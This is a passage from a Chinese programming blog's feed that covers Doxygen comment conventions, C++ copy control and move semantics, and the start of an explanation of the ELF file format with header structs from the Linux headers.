常用注释命令</h3><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>@file</td><td>指定文件名</td></tr><tr><td>@brief</td><td>概要信息</td></tr><tr><td>@details</td><td>详细描述</td></tr><tr><td>@todo</td><td>将要做的事情，链接到汇总的TODO 列表</td></tr><tr><td>@warning</td><td>警告信息</td></tr><tr><td>@exception</td><td>注释异常对象</td></tr><tr><td>@bug</td><td>缺陷，链接到所有缺陷汇总的缺陷列表</td></tr><tr><td>@since {text}</td><td>通常用来说明从什么版本、时间写此部分代码</td></tr><tr><td>@code</td><td>在注释中开始说明一段代码</td></tr><tr><td>@endcode</td><td>注释中代码段的结束</td></tr><tr><td>@pre</td><td>用来说明代码项的前提条件</td></tr><tr><td>@post</td><td>用来说明代码项之后的使用条件</td></tr><tr><td>@see</td><td>指定对其他代码项的引用链接</td></tr><tr><td>@note</td><td>开始一个段落，用来描述一些注意事项</td></tr><tr><td>@par</td><td>开始一个段落，段落名称描述由你自己指定</td></tr><tr><td>@include</td><td>包含文件</td></tr><tr><td>@deprecated</td><td>已废弃函数</td></tr><tr><td>@fn</td><td>函数说明</td></tr><tr><td>@param</td><td>解释函数参数</td></tr><tr><td>@return</td><td>描述返回意义</td></tr><tr><td>@retval</td><td>描述返回值具体意义</td></tr><tr><td>@var</td><td>变量</td></tr><tr><td>@enum</td><td>枚举</td></tr><tr><td>@struct</td><td>结构体</td></tr><tr><td>@class</td><td>类</td></tr></tbody></table><h3 id="7-2-3-项目整体注释"><a href="#7-2-3-项目整体注释" class="headerlink" title="7.2.3 项目整体注释"></a>7.2.3 项目整体注释</h3><p>对于应用程序一般放置在main.cpp中，对于库程序一般放置在较关键但不会被引用的文件中，以下是注释框架：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**@mainpage  标题</span><br><span class="hljs-comment">* &lt;table&gt;</span><br><span class="hljs-comment">* &lt;tr&gt;&lt;th&gt;Project  &lt;td&gt;工程名</span><br><span class="hljs-comment">* &lt;tr&gt;&lt;th&gt;Author   &lt;td&gt;作者名</span><br><span class="hljs-comment">* &lt;tr&gt;&lt;th&gt;Source   &lt;td&gt;源码路径</span><br><span class="hljs-comment">* &lt;/table&gt;</span><br><span class="hljs-comment">* @section   详细描述</span><br><span class="hljs-comment">* 这里是项目详细描述信息</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* @section   功能描述  </span><br><span class="hljs-comment">* -# 功能1</span><br><span class="hljs-comment">* -# 功能2</span><br><span class="hljs-comment">* -# 功能3</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* @section   用法描述 </span><br><span class="hljs-comment">* -# 用法1</span><br><span class="hljs-comment">* -# 用法2</span><br><span class="hljs-comment">* </span><br><span class="hljs-comment">* @section   历史更新</span><br><span class="hljs-comment">* &lt;table&gt;</span><br><span class="hljs-comment">* &lt;tr&gt;&lt;th&gt;Date        &lt;th&gt;H_Version  &lt;th&gt;S_Version  &lt;th&gt;Author    &lt;th&gt;Description  &lt;/tr&gt;</span><br><span class="hljs-comment">* &lt;tr&gt;&lt;td&gt;2022/08/17  &lt;td&gt;1.0    &lt;td&gt;S02010041808171   &lt;td&gt;更新人1  &lt;td&gt;更新内容&lt;/tr&gt;</span><br><span class="hljs-comment">* &lt;tr&gt;&lt;td&gt;2022/06/24  &lt;td&gt;1.1    &lt;td&gt;S02010041906241   &lt;td&gt;更新人2  &lt;td&gt;</span><br><span class="hljs-comment">* -# 更新内容1\n</span><br><span class="hljs-comment">* -# 更新内容2\n</span><br><span class="hljs-comment">* &lt;/tr&gt;</span><br><span class="hljs-comment">* &lt;/table&gt;</span><br><span class="hljs-comment">**********************************************************************************</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h3 id="7-2-2-文件注释"><a href="#7-2-2-文件注释" class="headerlink" title="7.2.2 文件注释"></a>7.2.2 文件注释</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @file 文件名</span><br><span class="hljs-comment"> * @brief 简介</span><br><span class="hljs-comment"> * @details 细节</span><br><span class="hljs-comment"> * @author 作者</span><br><span class="hljs-comment"> * @date 年-月-日</span><br><span class="hljs-comment"> * @version 版本号</span><br><span class="hljs-comment"> * @copyright 版权</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h3 id="7-2-3-函数注释"><a href="#7-2-3-函数注释" class="headerlink" title="7.2.3 函数注释"></a>7.2.3 函数注释</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* @brief 主函数</span><br><span class="hljs-comment">* @details 程序唯一入口</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* @param argc 命令参数个数</span><br><span class="hljs-comment">* @param argv 命令参数指针数组</span><br><span class="hljs-comment">* @return 程序执行成功与否</span><br><span class="hljs-comment">*     @retval 0 程序执行成功</span><br><span class="hljs-comment">*     @retval 1 程序执行失败</span><br><span class="hljs-comment">* @note 这里只是一个简单的例子</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++拷贝控制</title>
      <link href="/2022/12/06/c-kao-bei-kong-zhi/"/>
      <url>/2022/12/06/c-kao-bei-kong-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="1-拷贝控制核心"><a href="#1-拷贝控制核心" class="headerlink" title="1.拷贝控制核心"></a>1.拷贝控制核心</h1><p>对类所管理的资源进行拷贝的过程时需要使用到拷贝构造函数、拷贝赋值运算符、移动构造函数、移动赋值运算符以及析构函数，其中关系如下：</p><table><thead><tr><th>左值</th><th>右值</th><th>操作</th><th>调用</th></tr></thead><tbody><tr><td>当前类新对象</td><td>已初始化的对象</td><td>构造</td><td>拷贝构造或移动构造函数</td></tr><tr><td>已初始化对象</td><td>已初始化的对象</td><td>赋值</td><td>拷贝赋值或移动赋值运算符</td></tr></tbody></table><p>其中拷贝构造和移动构造函数复制产生了新对象，赋值和移动赋值复制了右值对象并销毁了左值原对象。</p><p><strong>可以把赋值的过程看成是拷贝和销毁的组合。</strong>如果有必要自己实现上述五种函数的任何一个，应该将其他4种也重写。</p><h1 id="2-拷贝控制成员"><a href="#2-拷贝控制成员" class="headerlink" title="2.拷贝控制成员"></a>2.拷贝控制成员</h1><h2 id="2-1-拷贝构造函数"><a href="#2-1-拷贝构造函数" class="headerlink" title="2.1 拷贝构造函数"></a>2.1 拷贝构造函数</h2><p><strong>参数1必须为当前类的引用，因为如果是传值，此时又会发生拷贝，会造成死循环。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">类名(<span class="hljs-type">const</span> 类名&amp; r);                <span class="hljs-comment">// 规范写法</span><br></code></pre></td></tr></table></figure><h2 id="2-2-拷贝赋值运算符"><a href="#2-2-拷贝赋值运算符" class="headerlink" title="2.2 拷贝赋值运算符"></a>2.2 拷贝赋值运算符</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">类名&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> 类名&amp; r);     <span class="hljs-comment">// 规范写法</span><br><br>类名&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> 类名 r);      <span class="hljs-comment">// copy and swap优化</span><br></code></pre></td></tr></table></figure><h3 id="2-2-1-自赋值安全"><a href="#2-2-1-自赋值安全" class="headerlink" title="2.2.1 自赋值安全"></a>2.2.1 自赋值安全</h3><p>示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// m_data是指向一块堆内存的指针</span><br>Foo&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Foo&amp; r) &#123;              <span class="hljs-comment">// r == this</span><br>    <span class="hljs-keyword">delete</span> m_data;                          <span class="hljs-comment">// 先释放内存  </span><br>    m_data = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[r.size];<br>    <span class="hljs-built_in">memcpy</span>(m_data, r.m_data, r.size);       <span class="hljs-comment">// 非法访问</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此时如果发生自赋值，m_data指向的内存先被释放，再去调用memcpy拷贝会访问非法内存区域。</p><h3 id="2-2-2-异常安全"><a href="#2-2-2-异常安全" class="headerlink" title="2.2.2 异常安全"></a>2.2.2 异常安全</h3><p>示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// m_data是指向一块堆内存的指针</span><br>Foo&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Foo&amp; r) &#123;              <br>    <span class="hljs-keyword">delete</span> m_data;                          <span class="hljs-comment">// 释放内存  </span><br>    m_data = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[r.size];               <span class="hljs-comment">// 抛出异常</span><br>    <span class="hljs-built_in">memcpy</span>(m_data, r.m_data, r.size);       <br>&#125;<br></code></pre></td></tr></table></figure><p>new运算可能会引用堆空间不足而抛出异常，会暂停当前函数执行，而this-&gt;m_data指向的内存区域被释放了，可能造成运行时错误。</p><h3 id="2-2-3-安全写法"><a href="#2-2-3-安全写法" class="headerlink" title="2.2.3 安全写法"></a>2.2.3 安全写法</h3><p>示例代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// m_data是指向一块堆内存的指针</span><br>Foo&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Foo&amp; r) &#123;              <br>    <span class="hljs-keyword">auto</span> tmp = m_data;                      <span class="hljs-comment">// 备份指针</span><br>    m_data = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[r.size];               <br>    <span class="hljs-built_in">memcpy</span>(m_data, r.m_data, r.size);       <br>    <span class="hljs-keyword">delete</span> tmp;                             <span class="hljs-comment">// 释放内存 </span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-移动构造函数"><a href="#2-3-移动构造函数" class="headerlink" title="2.3 移动构造函数"></a>2.3 移动构造函数</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">类名(类名&amp;&amp; r) <span class="hljs-keyword">noexcept</span>;<br></code></pre></td></tr></table></figure><p>将右值对象的内容窃取后，需要将右值对象置于可以被正确析构的状态。</p><h2 id="2-4-移动赋值运算符"><a href="#2-4-移动赋值运算符" class="headerlink" title="2.4 移动赋值运算符"></a>2.4 移动赋值运算符</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">类名&amp; <span class="hljs-keyword">operator</span>=(类名&amp;&amp; r) <span class="hljs-keyword">noexcept</span>;<br></code></pre></td></tr></table></figure><p><strong>移动操作尽量保证不抛出异常，因为一旦出现了异常，很难恢复原来的状态。</strong></p><h2 id="2-5-copy-x2F-move-and-swap"><a href="#2-5-copy-x2F-move-and-swap" class="headerlink" title="2.5 copy&#x2F;move and swap"></a>2.5 copy&#x2F;move and swap</h2><h3 id="2-5-1-原理"><a href="#2-5-1-原理" class="headerlink" title="2.5.1 原理"></a>2.5.1 原理</h3><p>拷贝&#x2F;移动赋值运算符 &#x3D;&#x3D; 拷贝&#x2F;移动构造函数 + 析构函数</p><p>拷贝&#x2F;移动都需要将右值资源拷贝一份或直接占为己有，再将原左值资源销毁。</p><h3 id="2-5-2-优点"><a href="#2-5-2-优点" class="headerlink" title="2.5.2 优点"></a>2.5.2 优点</h3><ul><li>更多的去复用已存在的代码，增加可维护性</li><li>天生自赋值、异常安全</li><li>一份赋值运算符重载函数代码拷贝和移动均适用</li></ul><h3 id="2-5-3-例子"><a href="#2-5-3-例子" class="headerlink" title="2.5.3 例子"></a>2.5.3 例子</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Foo::swap</span><span class="hljs-params">(Foo&amp; r)</span> <span class="hljs-keyword">noexcept</span> </span>&#123;<br>    <span class="hljs-keyword">using</span> std::swap;<br>    <span class="hljs-built_in">swap</span>(<span class="hljs-keyword">this</span>-&gt;m_data, r.m_data);<br>&#125;<br><br>Foo&amp; Foo::<span class="hljs-keyword">operator</span>=(Foo r) <span class="hljs-keyword">noexcept</span> &#123;       <span class="hljs-comment">// 这里不写引用，发生拷贝或移动构造</span><br>    <span class="hljs-built_in">swap</span>(r);                        <br>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;                           <span class="hljs-comment">// 离开作用域，销毁左值对象资源</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3-移动语义"><a href="#3-移动语义" class="headerlink" title="3.移动语义"></a>3.移动语义</h1><h2 id="3-1-存在的意义"><a href="#3-1-存在的意义" class="headerlink" title="3.1 存在的意义"></a>3.1 存在的意义</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">std::string <span class="hljs-title">get_string</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function">std::strring <span class="hljs-title">tmp</span><span class="hljs-params">(some_values())</span></span>;<br>    <span class="hljs-keyword">return</span> tmp;                             <span class="hljs-comment">// 拷贝构造</span><br>&#125;<br><br>std::string s = <span class="hljs-built_in">get_string</span>();               <span class="hljs-comment">// 拷贝构造</span><br></code></pre></td></tr></table></figure><p>严格按照C++语法来分析，上述代码发生了两次拷贝构造，简化含义就是将局部对象tmp的资源交给对象s。两次拷贝实际上是多余的，严重影响效率。移动语义就是通过移动资源所有权，避免发生拷贝的方式来提升效率。</p><h2 id="3-2-右值引用"><a href="#3-2-右值引用" class="headerlink" title="3.2 右值引用"></a>3.2 右值引用</h2><p>为了使用移动语义的思路来提高效率，最简单的方式就是提供具有移动功能的拷贝控制成员函数，当待拷贝的对象为右值的时候，就调用带有移动语义的拷贝构造函数；当待赋值的对象为右值的时候，就调用带有移动语义的赋值运算符。而为了与原拷贝控制成员构成重载关系，需要在参数列表处作出区分，参数从左值引用类型变为<strong>右值引用</strong>类型。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> left = <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span>&amp; lref = left;           <span class="hljs-comment">// 左值引用绑定左值</span><br><span class="hljs-type">int</span>&amp;&amp; rref = <span class="hljs-number">12</span>;            <span class="hljs-comment">// 右值引用绑定右值</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span>&amp; clref = <span class="hljs-number">12</span>;      <span class="hljs-comment">// 常量左值引用可以绑定右值</span><br></code></pre></td></tr></table></figure><p>右值引用延长了右值的生命期，也就是说右值引用类型实际上是左值，如下面代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Widget</span> &#123;<br>    std::string m_str;<br><span class="hljs-keyword">public</span>:<br>    ...<br>    Widget&amp; <span class="hljs-keyword">operator</span>=(Widget&amp;&amp; other) &#123;     <span class="hljs-comment">// 此时other是个左值</span><br>        m_str = other.m_str;                <span class="hljs-comment">// 此时调用std::string的拷贝赋值运算符</span><br>        m_str = std::<span class="hljs-built_in">move</span>(other.m_str);     <span class="hljs-comment">// 此时调用std::string的移动赋值运算符</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中<strong>std::move</strong>函数将左值强制转换成右值，内部使用static_cast&lt;&amp;&amp;&gt;实现转换。<strong>C++11规定，返回值为右值引用的函数调用为右值。</strong>std::mov_if_noexcept()如果类移动操作不抛出异常则返回右值，否则返回左值。</p><h2 id="3-3-新标准下的return"><a href="#3-3-新标准下的return" class="headerlink" title="3.3 新标准下的return"></a>3.3 新标准下的return</h2><p>C++11新标准下，函数中返回参数对象或者是局部对象时，会发生两次重载决议，第一次将要返回的对象当作右值进行匹配，如果匹配失败，再按照左值去返回。</p><p>C++17新标准下，返回局部对象的过程直接被省略，如下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Foo <span class="hljs-title">get_foo</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-function">Foo <span class="hljs-title">tmp</span><span class="hljs-params">(some_values())</span></span>;<br>    <span class="hljs-keyword">return</span> tmp;<br>&#125;<br><br><span class="hljs-function">Foo <span class="hljs-title">f</span><span class="hljs-params">(get_foo)</span></span>;<br></code></pre></td></tr></table></figure><p>上述代码等价于：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Foo <span class="hljs-title">f</span><span class="hljs-params">(some_values())</span></span>;<br></code></pre></td></tr></table></figure><h1 id="3-补充关键字"><a href="#3-补充关键字" class="headerlink" title="3.补充关键字"></a>3.补充关键字</h1><h2 id="3-1-delete关键字"><a href="#3-1-delete关键字" class="headerlink" title="3.1 delete关键字"></a>3.1 delete关键字</h2><p>有些对象不应该被拷贝，如IO对象，因为流是唯一的，无法进行同步。所以可以将不想被拷贝的类的拷贝控制成员函数指定为delete的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">Person</span>(<span class="hljs-type">const</span> Person&amp; p) = <span class="hljs-keyword">delete</span>;               <br>Person&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> Person&amp; p) = <span class="hljs-keyword">delete</span>;                <br></code></pre></td></tr></table></figure><h2 id="3-2-default关键字"><a href="#3-2-default关键字" class="headerlink" title="3.2 default关键字"></a>3.2 default关键字</h2><p>让编译器合成相关的函数，只适合一些不进行资源管理的类。</p><h2 id="3-3-explicit关键字"><a href="#3-3-explicit关键字" class="headerlink" title="3.3 explicit关键字"></a>3.3 explicit关键字</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span> 构造函数<br>explict Foo(std::size_t n);<br><br><span class="hljs-regexp">//</span> 定义对象<br>Foo a = <span class="hljs-string">&#x27;c&#x27;</span>;            <span class="hljs-regexp">//</span> 错误，不能发生隐式类型转化<br>Foo a(<span class="hljs-number">10</span>);              <span class="hljs-regexp">//</span> 正确<br></code></pre></td></tr></table></figure><p>在C++中，如果的构造函数只有<strong>一个参数</strong>时，那么在编译的时候就会有一个缺省的转换操作：将该构造函数对应数据类型的数据转换为该类对象。而explicit关键字就是禁止这一过程的发生。</p>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件格式</title>
      <link href="/2022/11/15/elf-wen-jian-ge-shi/"/>
      <url>/2022/11/15/elf-wen-jian-ge-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="1-ELF文件格式"><a href="#1-ELF文件格式" class="headerlink" title="1.ELF文件格式"></a>1.ELF文件格式</h1><p><strong>ELF</strong> (<strong>Executable and Linkable Format</strong>)是一种为可执行文件，目标文件，共享链接库和内核转储(core dumps)准备的标准文件格式。ELF文件有两个平行视角：一个是程序链接视角，一个是程序装载视角。从链接视角来看，ELF文件是按Section划分的；而从装载的视角来看，ELF文件又可以按Segment来划分。如图所示：</p><p><img src="/2022/11/15/elf-wen-jian-ge-shi/844554_FV5D8AW37MUCV33.png" alt="ELF双视图"></p><p>从整体来看，完整的ELF文件由ELF头（<strong>ELF header</strong>）、程序头表（<strong>Program header table</strong>）、节头表（<strong>Section header table</strong>）组成。</p><p><a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/elf.h#L220">linux&#x2F;elf.h at master · torvalds&#x2F;linux (github.com)</a></p><p><img src="/2022/11/15/elf-wen-jian-ge-shi/ELF-Walkthrough.png" alt="ELF双视图"></p><h2 id="1-1-ELF-Header"><a href="#1-1-ELF-Header" class="headerlink" title="1.1 ELF Header"></a>1.1 ELF Header</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> EI_NIDENT16</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf32_hdr</span>&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>e_ident[EI_NIDENT];<br>  Elf32_Halfe_type;<br>  Elf32_Halfe_machine;<br>  Elf32_Worde_version;<br>  Elf32_Addre_entry;  <span class="hljs-comment">/* Entry point */</span><br>  Elf32_Offe_phoff;<br>  Elf32_Offe_shoff;<br>  Elf32_Worde_flags;<br>  Elf32_Halfe_ehsize;<br>  Elf32_Halfe_phentsize;<br>  Elf32_Halfe_phnum;<br>  Elf32_Halfe_shentsize;<br>  Elf32_Halfe_shnum;<br>  Elf32_Halfe_shstrndx;<br>&#125; Elf32_Ehdr;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf64_hdr</span> &#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>e_ident[EI_NIDENT];<span class="hljs-comment">/* ELF Magic number and other info */</span><br>  Elf64_Half e_type;<span class="hljs-comment">/* Object file type */</span><br>  Elf64_Half e_machine;<span class="hljs-comment">/* CPU Architecture */</span><br>  Elf64_Word e_version;<span class="hljs-comment">/* Object file version */</span><br>  Elf64_Addr e_entry;<span class="hljs-comment">/* OEP */</span><br>  Elf64_Off e_phoff;<span class="hljs-comment">/* Program header table foa */</span><br>  Elf64_Off e_shoff;<span class="hljs-comment">/* Section header table foa */</span><br>  Elf64_Word e_flags;<span class="hljs-comment">/* Processor-specific flags */</span><br>  Elf64_Half e_ehsize;<span class="hljs-comment">/* ELF header size in bytes */</span><br>  Elf64_Half e_phentsize;<span class="hljs-comment">/* Program header table entry size */</span><br>  Elf64_Half e_phnum;<span class="hljs-comment">/* Program header table entry count */</span><br>  Elf64_Half e_shentsize;<span class="hljs-comment">/* Section header table entry size */</span><br>  Elf64_Half e_shnum;<span class="hljs-comment">/* Section header table entry count */</span><br>  Elf64_Half e_shstrndx;<span class="hljs-comment">/* Section header string table index */</span><br>&#125; Elf64_Ehdr;<br></code></pre></td></tr></table></figure><p><strong>详细字段说明：</strong><a href="https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html">ELF Header (linuxfoundation.org)</a></p><h3 id="1-1-1-e-type"><a href="#1-1-1-e-type" class="headerlink" title="1.1.1 e_type"></a>1.1.1 e_type</h3><p>表示ELF文件类型，有以下几种：</p><ul><li>ET_NONE: 位置类型</li><li>ET_REL: 可重定向类型(relocatable)，通常是编译后的*.o文件</li><li>ET_EXEC: 可执行类型(executable)，静态链接后的可执行文件 *.out</li><li>ET_DYN: 共享对象(shared object)，动态链接的可执行文件或动态库 *.so</li><li>ET_CORE: 程序崩溃生成的核心转储文件(coredump)</li></ul><h3 id="1-1-2-e-machine"><a href="#1-1-2-e-machine" class="headerlink" title="1.1.2 e_machine"></a>1.1.2 e_machine</h3><p>表示当前程序所需的CPU架构，常见有以下几种：</p><ul><li>EM_ARM: arm指令集</li><li>EM_X86_64: amd x86-64指令集</li></ul><h3 id="1-1-3-e-entry"><a href="#1-1-3-e-entry" class="headerlink" title="1.1.3 e_entry"></a>1.1.3 e_entry</h3><p>指定程序的入口虚拟地址，不是main函数地址，而是.text段的首地址_start。当然这也要求程序本身非PIE(<code>-no-pie</code>)编译的且ASLR关闭的情况下，对于非<code>ET_EXEC</code>类型通常并不是实际的虚拟地址值。</p><h3 id="1-1-4-e-shstrndx"><a href="#1-1-4-e-shstrndx" class="headerlink" title="1.1.4 e_shstrndx"></a>1.1.4 e_shstrndx</h3><p>表示section table名称字符串表在section table中的索引。</p><h2 id="1-2-Section-header-table"><a href="#1-2-Section-header-table" class="headerlink" title="1.2 Section header table"></a>1.2 Section header table</h2><p>一个由 e_shentsize 个大小为 e_shentsize 元素组成的数组，主要用来指定静态链接所使用的一些信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf32_shdr</span> &#123;</span><br>  Elf32_Wordsh_name;<br>  Elf32_Wordsh_type;<br>  Elf32_Wordsh_flags;<br>  Elf32_Addrsh_addr;<br>  Elf32_Offsh_offset;<br>  Elf32_Wordsh_size;<br>  Elf32_Wordsh_link;<br>  Elf32_Wordsh_info;<br>  Elf32_Wordsh_addralign;<br>  Elf32_Wordsh_entsize;<br>&#125; Elf32_Shdr;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf64_shdr</span> &#123;</span><br>  Elf64_Word sh_name;<span class="hljs-comment">/* Section name, index in string tbl */</span><br>  Elf64_Word sh_type;<span class="hljs-comment">/* Type of section */</span><br>  Elf64_Xword sh_flags;<span class="hljs-comment">/* Miscellaneous section attributes */</span><br>  Elf64_Addr sh_addr;<span class="hljs-comment">/* Section virtual addr at execution */</span><br>  Elf64_Off sh_offset;<span class="hljs-comment">/* Section file offset */</span><br>  Elf64_Xword sh_size;<span class="hljs-comment">/* 